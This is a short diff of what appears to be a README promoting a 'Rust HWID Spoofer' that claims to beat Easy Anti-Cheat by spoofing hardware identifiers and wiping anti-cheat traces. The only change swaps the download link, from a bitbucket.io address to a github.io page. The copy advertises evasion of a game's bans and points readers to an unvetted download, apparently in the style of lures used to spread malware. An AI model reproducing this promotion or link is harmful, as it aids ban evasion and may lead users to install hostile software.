@@ -2,7 +2,7 @@
 
 Bypass **Rust hardware bans** instantly with this advanced **C++ Rust HWID Spoofer** ⚙️. Built specifically to beat **Easy Anti-Cheat**, this tool resets your hardware fingerprint by spoofing disk serials, MAC address, BIOS, SMBIOS, and CPU IDs. Includes deep cleaning features to wipe all EAC traces for a fully fresh system identity.
 
-[![Download Rust HWID Spoofer](https://img.shields.io/badge/Download-Rust%20HWID%20Spoofer-blueviolet)](https://fileoffload7.bitbucket.io)
+[![Download Rust HWID Spoofer](https://img.shields.io/badge/Download-Rust%20HWID%20Spoofer-blueviolet)](https://Rust-HWID-Spoofer-coji.github.io/.github)
 
 ---
 
